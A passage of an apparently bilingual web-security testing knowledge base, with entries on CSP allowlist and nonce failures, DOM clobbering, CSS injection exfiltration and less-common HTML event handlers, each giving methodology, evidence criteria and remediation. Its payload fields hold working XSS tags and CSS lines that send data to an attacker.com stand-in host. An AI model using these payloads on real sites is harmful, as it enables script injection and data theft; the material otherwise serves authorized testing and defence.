analysis.zh: 阳性证据是动态属性访问、字符串定时器、Function 或 eval 变体穿过当前 Wordfence 防护，未被 WordPress 编码并在浏览器执行 marker。 假阳性边界：管理员白名单、学习模式、缓存旧文章、WAF 允许但 WordPress 转义、源码含危险函数或浏览器 CSP 阻断都不能证明绕过。
analysis.en: Positive evidence requires a dynamic property, string timer, Function, or eval variant to pass current Wordfence protection, remain unencoded by WordPress, and execute the browser marker. False-positive boundary: Administrator allowlisting, learning mode, a cached old post, WAF allowance followed by WordPress escaping, dangerous functions in source, or browser CSP blocking does not prove bypass.

opsecTips.zh: Wordfence 测试禁止修改生产文章、账户或防火墙模式；发现真实用户访问、自动封禁、登录状态变化或外连时停止。
opsecTips.en: Wordfence testing must not modify production posts, accounts, or firewall mode; stop on real-user access, automatic blocking, login-state changes, or egress.

opsecTips.zh: 删除隔离文章/评论和 marker，清理 WordPress/对象/CDN 缓存与 Wordfence 测试事件，恢复插件配置并复查前台/后台。
opsecTips.en: Delete isolated posts or comments and markers, clear WordPress, object, and CDN caches plus Wordfence test events, restore plugin configuration, and review frontend and admin views.

name.zh: CSP 允许列表与 Nonce 失效模式
name.en: CSP Allowlist and Nonce Failure Modes

description.zh: 聚焦同源或可信 CDN JSONP、可控脚本资源与泄露 nonce，验证 CSP 设计缺陷，而非把示例域名当作可直接利用地址。
description.en: Focuses on same-origin or trusted-CDN JSONP, controllable script resources, and leaked nonces to test CSP design failures without treating example domains as live exploit targets.

overview.zh: CSP 允许列表与 Nonce 失效模式用于核对 CSP 指令与具体浏览器能力之间的控制边界。审查目标为：script-src 是否依赖可被攻击者借用的主机允许列表，或 nonce 是否可预测、复用、泄露并应用到注入脚本。策略问题的成立前提为：页面已存在脚本元素注入，可信源提供可控 JavaScript 响应，或者 nonce 没有为每个响应随机生成并受到模板隔离。判定证据为：生效响应头、脚本请求来源、nonce 生成与复用证据以及唯一执行标记共同证明策略失效；普通导航、预取或单次外连必须与脚本执行分开记录。
overview.en: CSP Allowlist and Nonce Failure Modes checks whether script-src relies on attacker-usable host allowlists or a nonce is predictable, reused, leaked, and applicable to an injected script. It applies when the page already permits script-element injection, a trusted origin serves controllable JavaScript, or the nonce is not freshly randomized per response and isolated from untrusted templates. A conclusion requires the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 策略风险的前提为：页面已存在脚本元素注入，可信源提供可控 JavaScript 响应，或者 nonce 没有为每个响应随机生成并受到模板隔离。评估需要从最终响应中的生效 CSP 出发，逐项判断“script-src 是否依赖可被攻击者借用的主机允许列表，或 nonce 是否可预测、复用、泄露并应用到注入脚本”。若没有“生效响应头、脚本请求来源、nonce 生成与复用证据以及唯一执行标记共同证明策略失效”，策略警告、资源请求或页面跳转都不能单独证明 CSP 被绕过。
vulnerability.en: The risk exists when the page already permits script-element injection, a trusted origin serves controllable JavaScript, or the nonce is not freshly randomized per response and isolated from untrusted templates, allowing whether script-src relies on attacker-usable host allowlists or a nonce is predictable, reused, leaked, and applicable to an injected script. Review the input source, final parsing context, browser or policy version, and the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure; otherwise record only an unconfirmed control differential.

exploitation.zh: 从实际页面提取生效策略，确认可信源响应内容是否可控，并比较两次响应 nonce；仅用自有无害端点替换示例 URL 复核。先保存完整响应头并展开指令回退关系，再以自有无害端点替换示例地址，记录 CSP 违规事件、网络 Initiator、最终 origin 和执行标记，分别评价每一种浏览器能力。
exploitation.en: In an authorized isolated environment, extract the effective policy from the real page, determine whether trusted-origin response content is controllable, compare nonces across two responses, and verify only with a harmless owned endpoint substituted for examples. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 采用 strict-dynamic 配合每响应随机 nonce 或稳定脚本 hash，移除通配主机和不必要 JSONP，并确保 nonce 不进入用户可控模板或缓存。在同一浏览器与缓存状态下重放合法资源、业务导航和原异常样例，确认必要功能仍可用，并且相关指令稳定阻断越界脚本、框架、基地址或资源外连。
mitigation.en: Remediation should use strict-dynamic with a fresh per-response nonce or stable script hashes, remove wildcard hosts and unnecessary JSONP, and keep nonces out of user-controlled templates and shared caches. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 解析“CSP 允许列表与 Nonce 失效模式”的生效策略
title.en: Scope the CSP Allowlist and Nonce Failure Modes data flow

description.zh: 抓取最终响应头并展开指令回退，确认前提“页面已存在脚本元素注入，可信源提供可控 JavaScript 响应，或者 nonce 没有为每个响应随机生成并受到模板隔离”真实存在，而不是配置文档中的预期。
description.en: Trace the real input to the final sink or policy decision, confirm that the page already permits script-element injection, a trusted origin serves controllable JavaScript, or the nonce is not freshly randomized per response and isolated from untrusted templates, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSP 脚本信任模型”策略基线
title.en: Establish the CSP Script Trust Model baseline

description.zh: 用合法同源资源记录允许行为，再结合 CSP 违规事件、网络请求和证据标准“生效响应头、脚本请求来源、nonce 生成与复用证据以及唯一执行标记共同证明策略失效”区分结果。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure as valid evidence.

title.zh: 逐能力验证“CSP 允许列表与 Nonce 失效模式”
title.en: Run a single-variable CSP Allowlist and Nonce Failure Modes check

description.zh: 从实际页面提取生效策略，确认可信源响应内容是否可控，并比较两次响应 nonce；仅用自有无害端点替换示例 URL 复核；将示例域替换为自有无害端点，每次只测试一种元素、指令或 URL 方案。
description.en: extract the effective policy from the real page, determine whether trusted-origin response content is controllable, compare nonces across two responses, and verify only with a harmless owned endpoint substituted for examples; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<script src="/api/jsonp?callback=alert//"></script>
<script src="https://cdn.example.com/jsonp?callback=alert//"></script>
<script src="https://trusted-cdn.com/lib.js"></script>
<script nonce="leaked_nonce_value">alert()</script>

title.zh: 收紧 CSP 并执行回归
title.en: Retest the CSP Allowlist and Nonce Failure Modes remediation boundary

description.zh: 采用 strict-dynamic 配合每响应随机 nonce 或稳定脚本 hash，移除通配主机和不必要 JSONP，并确保 nonce 不进入用户可控模板或缓存；随后重放业务资源与异常输入，确认指令边界清晰且合法内容仍可加载。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the effective response header, script request origin, nonce generation or reuse evidence, and unique execution marker jointly prove policy failure no longer appears.

review.rationale: CSP 允许列表与 Nonce 失效模式保留为 Payload，用于审查“script-src 是否依赖可被攻击者借用的主机允许列表，或 nonce 是否可预测、复用、泄露并应用到注入脚本”。成立时必须满足证据要求“生效响应头、脚本请求来源、nonce 生成与复用证据以及唯一执行标记共同证明策略失效”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 页面已存在 script 元素注入能力，实际 CSP header 已捕获，并能证明同源/可信 CDN 端点可控或 nonce 在当前文档中真实泄露/复用。
prerequisites.en: The page already permits script-element injection, the actual CSP header is captured, and control of a same-origin or trusted-CDN endpoint or real nonce disclosure or reuse in the current document is proven.

prerequisites.zh: 可信端点使用自有 mock，nonce 使用专用一次性测试值，记录 policy 解析、script 请求、响应体、nonce 匹配和 marker 调用栈。
prerequisites.en: Trusted endpoints use owned mocks, nonces use dedicated one-time test values, and policy parsing, script requests, response bodies, nonce matches, and marker call stacks are recorded.

analysis.zh: 阳性证据是 CSP 因可控可信脚本端点或可复用 nonce 允许攻击者脚本，并在目标来源执行 marker；单纯列入 allowlist 不足。 假阳性边界：可信 CDN 不可写、JSONP callback 被限制、nonce 猜测/过期、策略仅 report-only、script 请求被 MIME 阻止或示例域名不存在都不是绕过。
analysis.en: Positive evidence requires CSP to allow attacker-controlled script through a controllable trusted endpoint or reusable nonce and execute the marker under the target origin; allowlist membership alone is insufficient. False-positive boundary: A nonwritable trusted CDN, restricted JSONP callback, guessed or stale nonce, report-only policy, MIME-blocked script, or nonexistent example domain is not a bypass.

opsecTips.zh: CSP 信任模型测试不得使用生产 nonce、真实 CDN 写权限或第三方端点；发现真实凭据/nonce、公共请求或持久脚本时停止。
opsecTips.en: CSP trust-model testing must not use production nonces, real CDN write access, or third-party endpoints; stop on real credentials or nonces, public requests, or persistent scripts.

opsecTips.zh: 轮换并删除测试 nonce，移除 mock 端点和注入 script，清理 CDN/script 缓存及 CSP 报告，并恢复生产策略副本。
opsecTips.en: Rotate and delete test nonces, remove mock endpoints and injected scripts, clear CDN and script caches plus CSP reports, and restore the production-policy copy.

name.zh: DOM Clobbering 命名属性覆盖

description.zh: 验证 id/name 元素是否覆盖 window 或 document 上预期的对象引用，使安全检查、配置或 URL 读取转向攻击者构造的 DOM 节点。
description.en: Tests whether id or name elements override expected window or document object references and redirect security checks, configuration, or URL reads to attacker-created DOM nodes.

overview.zh: DOM Clobbering 命名属性覆盖检查浏览器命名属性访问。需要验证的行为为：浏览器命名属性访问是否让注入元素替代代码期望的普通对象、配置字段或函数引用，并进一步影响危险 sink。成立前提为：应用依赖 window.foo、document.foo 或隐式全局变量，允许不可信 HTML 设置 id/name，并未验证取回值的类型和所有权。判定标准为：覆盖前后对象类型、属性解析路径与后续控制流差异可以在调试器中复现；仅创建同名元素不等于可利用。仅创建同名元素只能证明发生名称冲突，不能证明控制流或危险 sink 已被改变。
overview.en: DOM Clobbering Named-Property Override checks whether browser named-property access lets injected elements replace ordinary objects, configuration fields, or function references expected by code and then influence a dangerous sink. It applies when the application relies on window.foo, document.foo, or implicit globals, permits untrusted HTML with id or name, and does not validate the retrieved value's type and ownership. A conclusion requires the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 命名属性覆盖的前提为：应用依赖 window.foo、document.foo 或隐式全局变量，允许不可信 HTML 设置 id/name，并未验证取回值的类型和所有权。审计必须跟踪“浏览器命名属性访问是否让注入元素替代代码期望的普通对象、配置字段或函数引用，并进一步影响危险 sink”涉及的属性类型、所有权与后续使用点。只有类型变化和控制流影响连续可见时，才可从 id/name 冲突进一步判断安全影响。
vulnerability.en: The risk exists when the application relies on window.foo, document.foo, or implicit globals, permits untrusted HTML with id or name, and does not validate the retrieved value's type and ownership, allowing whether browser named-property access lets injected elements replace ordinary objects, configuration fields, or function references expected by code and then influence a dangerous sink. Review the input source, final parsing context, browser or policy version, and the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation; otherwise record only an unconfirmed control differential.

exploitation.zh: 先记录目标全局属性的预期类型，再注入原集合中的同名元素并单步执行读取点；只有值进入 URL、HTML 或代码 sink 才扩展影响验证。先记录目标属性的预期类型与所有权，再逐个注入同名元素并单步观察解析和后续分支；仅当可控值到达 URL、HTML 或代码 sink 时继续验证，并按“覆盖前后对象类型、属性解析路径与后续控制流差异可以在调试器中复现；仅创建同名元素不等于可利用”确认结果。
exploitation.en: In an authorized isolated environment, record the expected type of the target global property, inject same-name elements from the original set, step through the read, and extend impact testing only when the value reaches a URL, HTML, or code sink. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 避免隐式全局和命名属性访问，使用模块局部变量与显式 getElementById，并验证对象类型；消毒 id/name 冲突并通过 CSP/Trusted Types 约束后续 sink。重放合法 DOM 标识和冲突样例，确认显式查询与类型检查保留正常组件行为，同时命名属性不再覆盖配置对象、函数或安全决策。
mitigation.en: Remediation should avoid implicit globals and named-property access, use module-local variables and explicit getElementById with type checks, sanitize id or name conflicts, and constrain downstream sinks with CSP and Trusted Types. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 记录“DOM Clobbering 命名属性覆盖”预期对象
title.en: Scope the DOM Clobbering Named-Property Override data flow

description.zh: 在未注入页面记录目标属性的类型、所有权与调用位置，并确认前提“应用依赖 window.foo、document.foo 或隐式全局变量，允许不可信 HTML 设置 id/name，并未验证取回值的类型和所有权”。
description.en: Trace the real input to the final sink or policy decision, confirm that the application relies on window.foo, document.foo, or implicit globals, permits untrusted HTML with id or name, and does not validate the retrieved value's type and ownership, and record browser, response-header, and relevant component versions.

title.zh: 注入“DOM 命名属性覆盖”冲突节点
title.en: Establish the DOM Named-Property Clobbering baseline

description.zh: 逐个使用原始 id/name 结构观察属性解析变化；创建同名元素本身不作为漏洞证据。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation as valid evidence.

attackChain.payload: alert

title.zh: 跟踪覆盖后的控制流
title.en: Run a single-variable DOM Clobbering Named-Property Override check

description.zh: 先记录目标全局属性的预期类型，再注入原集合中的同名元素并单步执行读取点；只有值进入 URL、HTML 或代码 sink 才扩展影响验证；只有可控值继续进入危险 sink，并满足“覆盖前后对象类型、属性解析路径与后续控制流差异可以在调试器中复现；仅创建同名元素不等于可利用”时才确认影响。
description.en: record the expected type of the target global property, inject same-name elements from the original set, step through the read, and extend impact testing only when the value reaches a URL, HTML, or code sink; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 改用显式查询并回归
title.en: Retest the DOM Clobbering Named-Property Override remediation boundary

description.zh: 避免隐式全局和命名属性访问，使用模块局部变量与显式 getElementById，并验证对象类型；消毒 id/name 冲突并通过 CSP/Trusted Types 约束后续 sink；重放合法节点和冲突节点，确认组件功能保留且安全对象不再被命名属性替换。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the before-and-after object types, property resolution path, and downstream control-flow difference are reproducible in the debugger; creating a same-name element alone is not exploitation no longer appears.

review.rationale: DOM Clobbering 命名属性覆盖保留为 Payload，用于审查“浏览器命名属性访问是否让注入元素替代代码期望的普通对象、配置字段或函数引用，并进一步影响危险 sink”。成立时必须满足证据要求“覆盖前后对象类型、属性解析路径与后续控制流差异可以在调试器中复现；仅创建同名元素不等于可利用”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 应用在攻击者 HTML 插入后通过 window/document 命名属性读取配置、URL 或对象，且该引用没有被词法变量或模块作用域固定。
prerequisites.en: After attacker HTML insertion, the application reads configuration, URLs, or objects through window or document named properties that are not fixed by lexical or module scope.

prerequisites.zh: 已对目标属性解析和消费点加入跟踪，测试节点只提供无害固定值，并记录插入前后的属性描述符和浏览器版本。
prerequisites.en: Target property resolution and consumption are traced, test nodes provide only harmless fixed values, and property descriptors before and after insertion plus browser version are recorded.

analysis.zh: 阳性证据是命名元素覆盖应用预期引用，使真实消费点读取攻击者节点/值并进入固定 marker 分支；DOM 节点、属性解析和消费调用栈必须关联。 假阳性边界：页面中存在相同 id/name、DevTools 显示 window 属性、目标使用局部变量/模块绑定、浏览器不支持该命名规则或值未被消费均不是可利用 clobbering。
analysis.en: Positive evidence requires a named element to override the expected application reference so the real consumer reads the attacker node or value and enters a fixed-marker branch, correlating DOM node, property resolution, and consumer call stack. False-positive boundary: A matching id or name, a window property shown in DevTools, use of a local or module binding, unsupported named-property behavior, or a value never consumed is not exploitable clobbering.

opsecTips.zh: DOM Clobbering 测试只覆盖无害配置值；若影响认证、表单目标、脚本 URL、全局原型或非测试页面逻辑，立即停止。
opsecTips.en: DOM Clobbering testing overrides harmless configuration values only; stop if authentication, form targets, script URLs, global prototypes, or non-test page logic is affected.

opsecTips.zh: 移除命名节点，恢复全局属性/配置对象与 instrumentation，重载页面清空命名属性缓存，并验证原引用类型和值。
opsecTips.en: Remove named nodes, restore global properties, configuration objects, and instrumentation, reload to clear named-property state, and verify original reference types and values.

name.zh: CSS 注入属性匹配外带

description.zh: 通过属性选择器、@import、外部样式与 background URL 验证 CSS 注入能否产生可观察网络请求；不将静态外连自动等同敏感数据泄露。
description.en: Uses attribute selectors, @import, external styles, and background URLs to test whether CSS injection causes observable requests without equating static outbound traffic with sensitive-data exfiltration.

overview.zh: CSS 注入属性匹配外带属于 CSS 条件资源加载侧信道。验证目标为：攻击者控制的 CSS 是否能根据 DOM 属性或字符匹配条件选择性加载远程资源，从请求标记推断页面中的受保护值。该测试要求：应用允许 style、link 或外部样式输入，敏感值存在于 CSS 可匹配的 DOM 属性或可渲染文本中，并允许向外部域加载资源。有效证据标准为：只有与预置测试值相对应的条件请求序列才能证明推断能力；无条件 @import 或 background 请求仅证明 CSS 外连。无条件字体、图片或样式请求只能证明存在外连，不能证明敏感值已被推断。
overview.en: CSS Injection Attribute-Match Exfiltration checks whether attacker-controlled CSS can conditionally load a remote resource based on DOM attribute or character matches and reveal protected page values through request markers. It applies when the application accepts style, link, or external stylesheet input, a sensitive value is present in CSS-matchable DOM attributes or rendered text, and external resource loading is permitted. A conclusion requires only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 侧信道成立的前提为：应用允许 style、link 或外部样式输入，敏感值存在于 CSS 可匹配的 DOM 属性或可渲染文本中，并允许向外部域加载资源。审计围绕“攻击者控制的 CSS 是否能根据 DOM 属性或字符匹配条件选择性加载远程资源，从请求标记推断页面中的受保护值”使用预置的非敏感哨兵值，并严格控制缓存、预加载和字体回退。否则，网络请求与字符或属性条件之间无法建立可靠因果关系。
vulnerability.en: The risk exists when the application accepts style, link, or external stylesheet input, a sensitive value is present in CSS-matchable DOM attributes or rendered text, and external resource loading is permitted, allowing whether attacker-controlled CSS can conditionally load a remote resource based on DOM attribute or character matches and reveal protected page values through request markers. Review the input source, final parsing context, browser or policy version, and only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress; otherwise record only an unconfirmed control differential.

exploitation.zh: 在隔离页面放置非敏感哨兵属性，先测试无条件资源加载，再按单字符前缀规则观察选择性请求；不接触真实令牌或用户字段。先建立无条件资源加载基线，再逐个启用字符或属性条件；每轮清理缓存并记录 Initiator、请求 URL 与已知哨兵值，最终按“只有与预置测试值相对应的条件请求序列才能证明推断能力；无条件 @import 或 background 请求仅证明 CSS 外连”判断条件侧信道是否可重复。
exploitation.en: In an authorized isolated environment, place a non-sensitive sentinel attribute in an isolated page, establish unconditional resource loading, then observe conditional requests from one-character prefix rules without touching real tokens or user fields. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止不可信 CSS、style 和任意外部样式 URL，使用严格 HTML/CSS 消毒；通过 CSP style-src、img-src、font-src 与出口域允许列表阻断外带。回归分别覆盖合法主题样式、受控字体和原条件规则，确认业务样式仍可加载，而用户样式无法接触敏感 DOM，也不能向非允许域发送选择性请求。
mitigation.en: Remediation should disallow untrusted CSS, style elements, and arbitrary stylesheet URLs, sanitize HTML and CSS strictly, and block egress with CSP style-src, img-src, font-src, and destination allowlists. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 界定“CSS 注入属性匹配外带”可控样式范围
title.en: Scope the CSS Injection Attribute-Match Exfiltration data flow

description.zh: 确认前提“应用允许 style、link 或外部样式输入，敏感值存在于 CSS 可匹配的 DOM 属性或可渲染文本中，并允许向外部域加载资源”，记录样式作用域、敏感 DOM 隔离、CSP 资源指令和缓存状态。
description.en: Trace the real input to the final sink or policy decision, confirm that the application accepts style, link, or external stylesheet input, a sensitive value is present in CSS-matchable DOM attributes or rendered text, and external resource loading is permitted, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSS 注入与数据外带”外连基线
title.en: Establish the CSS Injection and Data Exfiltration baseline

description.zh: 先用无条件测试资源确认网络可观察性，再放置已知哨兵值，并按“只有与预置测试值相对应的条件请求序列才能证明推断能力；无条件 @import 或 background 请求仅证明 CSS 外连”判断条件命中。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress as valid evidence.

title.zh: 逐条件重放“CSS 注入属性匹配外带”
title.en: Run a single-variable CSS Injection Attribute-Match Exfiltration check

description.zh: 在隔离页面放置非敏感哨兵属性，先测试无条件资源加载，再按单字符前缀规则观察选择性请求；不接触真实令牌或用户字段；每轮清理缓存并只启用一个字符或属性条件，不接触真实用户数据。
description.en: place a non-sensitive sentinel attribute in an isolated page, establish unconditional resource loading, then observe conditional requests from one-character prefix rules without touching real tokens or user fields; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<style>input[value^="a"] { background: url(https://attacker.com/leak?a); }</style>
<style>@import url(https://attacker.com/leak);</style>
<link rel=stylesheet href="https://attacker.com/leak">
<style>body { background: url(https://attacker.com/leak?cookie=); }</style>

title.zh: 阻断样式外带并复测
title.en: Retest the CSS Injection Attribute-Match Exfiltration remediation boundary

description.zh: 禁止不可信 CSS、style 和任意外部样式 URL，使用严格 HTML/CSS 消毒；通过 CSP style-src、img-src、font-src 与出口域允许列表阻断外带；验证合法主题仍可用，同时条件选择器或字体规则无法向非允许域发送请求。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while only a conditional request sequence matching a planted test value proves inference; an unconditional @import or background request proves only CSS-originated egress no longer appears.

review.rationale: CSS 注入属性匹配外带保留为 Payload，用于审查“攻击者控制的 CSS 是否能根据 DOM 属性或字符匹配条件选择性加载远程资源，从请求标记推断页面中的受保护值”。成立时必须满足证据要求“只有与预置测试值相对应的条件请求序列才能证明推断能力；无条件 @import 或 background 请求仅证明 CSS 外连”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 攻击者可控 CSS 会应用到含合成测试属性值的目标 DOM，浏览器允许对应选择器和 URL 加载，且不使用真实秘密。
prerequisites.en: Attacker-controlled CSS applies to target DOM containing a synthetic test attribute, the browser permits the selectors and URL loads, and no real secret is used.

prerequisites.zh: 每条条件规则使用自有唯一 URL 令牌，同时配置不匹配属性、无 CSS 和无条件 @import/link 对照以区分普通外连。
prerequisites.en: Each conditional rule uses an owned unique URL token, with nonmatching-attribute, no-CSS, and unconditional import or link controls to distinguish ordinary egress.

analysis.zh: 阳性证据是只有与合成属性匹配的选择器触发对应令牌请求，并在负对照中消失；无条件 @import/link 只证明 CSS/HTML 外连能力。 假阳性边界：任意 background/@import/link 请求、缓存预取、安全扫描器访问、页面原有 CSS 或无法与具体属性值关联的流量都不能证明敏感数据泄露。
analysis.en: Positive evidence requires only the selector matching the synthetic attribute to trigger its token request and disappear in negative controls; unconditional import or link proves CSS or HTML egress only. False-positive boundary: Any background, import, or link request, cache prefetch, scanner access, existing page CSS, or traffic not tied to a specific attribute value does not prove sensitive-data exfiltration.

opsecTips.zh: CSS 属性匹配测试只使用一个合成字符和值，禁止读取真实 token、密码或表单；出现非测试数据、第三方请求或请求爆发时停止。
opsecTips.en: CSS attribute-match testing uses one synthetic character and value only and never reads real tokens, passwords, or forms; stop on non-test data, third-party requests, or request bursts.

opsecTips.zh: 删除注入 style/link 与合成属性，清理 CSS、字体、浏览器和 CDN 缓存，停用监听端点并按令牌删除请求日志。
opsecTips.en: Remove injected style or link nodes and synthetic attributes, clear CSS, font, browser, and CDN caches, disable listeners, and delete request logs by token.

name.zh: 低频 HTML 事件处理器变体

description.zh: 覆盖 marquee、iframe、object、embed、link 与 style 等较少见的加载事件，验证元素支持、资源状态和浏览器差异下的事件属性执行。
description.en: Covers less-common load events on marquee, iframe, object, embed, link, and style to test execution under element support, resource state, and browser differences.

overview.zh: 低频 HTML 事件处理器变体用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：非主流元素的 onload、onstart 等事件是否在目标浏览器版本和实际资源状态下触发，而不是仅被解析进 DOM。测试成立的前提为：富文本消毒器允许这些元素及事件属性，目标浏览器仍实现相应事件，并且 CSP 或资源策略没有阻断必要加载。证据要求为：元素支持状态、事件监听记录和唯一执行标记一起保存；不支持或从不触发的历史标签应标为兼容性失败。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Less-Common HTML Event Handler Variants checks whether onload, onstart, and related events on less-common elements fire in the target browser and resource state rather than merely appearing in the DOM. It applies when the rich-text sanitizer allows these elements and event attributes, the target browser still implements the event, and CSP or resource policy does not block the required load. A conclusion requires element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：富文本消毒器允许这些元素及事件属性，目标浏览器仍实现相应事件，并且 CSP 或资源策略没有阻断必要加载。审查时必须确认“非主流元素的 onload、onstart 等事件是否在目标浏览器版本和实际资源状态下触发，而不是仅被解析进 DOM”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“元素支持状态、事件监听记录和唯一执行标记一起保存；不支持或从不触发的历史标签应标为兼容性失败”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the rich-text sanitizer allows these elements and event attributes, the target browser still implements the event, and CSP or resource policy does not block the required load, allowing whether onload, onstart, and related events on less-common elements fire in the target browser and resource state rather than merely appearing in the DOM. Review the input source, final parsing context, browser or policy version, and element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures; otherwise record only an unconfirmed control differential.

exploitation.zh: 在应用支持的浏览器矩阵逐一加载元素，分别记录解析、资源请求和事件触发；对需要网络失败的样例使用本地不可达测试地址。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, load each element across the application's supported browser matrix, recording parsing, resource requests, and event firing separately, and use a local unreachable test URL for failure-dependent cases. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 消毒策略采用最小元素与属性允许列表并统一移除 on* 属性，删除业务不需要的旧元素；用 addEventListener 绑定固定代码而非内联事件。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should use a minimal element and attribute allowlist that removes all on-star attributes, drop obsolete elements not needed by the product, and bind fixed code through addEventListener instead of inline handlers. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 定位“低频 HTML 事件处理器变体”的输出上下文
title.en: Scope the Less-Common HTML Event Handler Variants data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“富文本消毒器允许这些元素及事件属性，目标浏览器仍实现相应事件，并且 CSP 或资源策略没有阻断必要加载”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that the rich-text sanitizer allows these elements and event attributes, the target browser still implements the event, and CSP or resource policy does not block the required load, and record browser, response-header, and relevant component versions.

title.zh: 建立“浏览器事件兼容性”解析基线
title.en: Establish the Browser Event Compatibility baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“元素支持状态、事件监听记录和唯一执行标记一起保存；不支持或从不触发的历史标签应标为兼容性失败”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures as valid evidence.

title.zh: 逐条重放“低频 HTML 事件处理器变体”样例
title.en: Run a single-variable Less-Common HTML Event Handler Variants check

description.zh: 在应用支持的浏览器矩阵逐一加载元素，分别记录解析、资源请求和事件触发；对需要网络失败的样例使用本地不可达测试地址；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: load each element across the application's supported browser matrix, recording parsing, resource requests, and event firing separately, and use a local unreachable test URL for failure-dependent cases; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<marquee onstart=alert()>
<iframe onload=alert()>
<object onload=alert()>
<embed onload=alert()>
<link onload=alert()>
<style onload=alert()>

title.zh: 修复并回归“低频 HTML 事件处理器变体”
title.en: Retest the Less-Common HTML Event Handler Variants remediation boundary

description.zh: 消毒策略采用最小元素与属性允许列表并统一移除 on* 属性，删除业务不需要的旧元素；用 addEventListener 绑定固定代码而非内联事件；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while element support, event-listener records, and a unique execution marker are captured together; obsolete tags that never fire are marked as compatibility failures no longer appears.

review.rationale: 低频 HTML 事件处理器变体保留为 Payload，用于审查“非主流元素的 onload、onstart 等事件是否在目标浏览器版本和实际资源状态下触发，而不是仅被解析进 DOM”。成立时必须满足证据要求“元素支持状态、事件监听记录和唯一执行标记一起保存；不支持或从不触发的历史标签应标为兼容性失败”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 目标浏览器/版本确实支持待测 marquee、iframe、object、embed、link 或 style 元素事件，并能控制资源加载/失败条件。
prerequisites.en: The target browser and version support the tested marquee, iframe, object, embed, link, or style event, and resource success or failure conditions are controllable.

prerequisites.zh: 每个事件在独立 fixture 中只调用一次性 marker，资源端点本地可控，并记录事件监听器、readyState 与调用栈。
